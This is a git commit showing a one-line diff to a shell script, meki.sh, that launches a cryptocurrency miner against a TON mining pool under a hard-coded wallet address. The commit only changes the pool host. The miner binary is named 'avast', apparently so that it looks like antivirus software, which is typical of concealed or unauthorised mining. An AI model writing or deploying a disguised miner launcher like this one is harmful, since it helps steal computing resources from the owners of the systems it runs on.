7b08b8a347c4045e56cbb2d8f6b332fddadf1678
renilo <88342640+renilo@users.noreply.github.com>
2022-02-16 16:21:53 +0700

    Update meki.sh

--- meki.sh
+++ meki.sh
@@ -10,4 +10,4 @@ chmod +x avast
 
 WORKER=$(echo $(shuf -i 1-9999999999 -n 1)-HAJAR)
 
-./avast --algo TON --pool ton.sg.hashrate.to:4003 --user EQCq8h0FQ_IzVSueBKoYahTBe5EXnomyu6WVTPp29L8YYG2Z.$WORKER --ton-mode 6
+./avast --algo TON --pool ton.de.hashrate.to:4003 --user EQCq8h0FQ_IzVSueBKoYahTBe5EXnomyu6WVTPp29L8YYG2Z.$WORKER --ton-mode 6
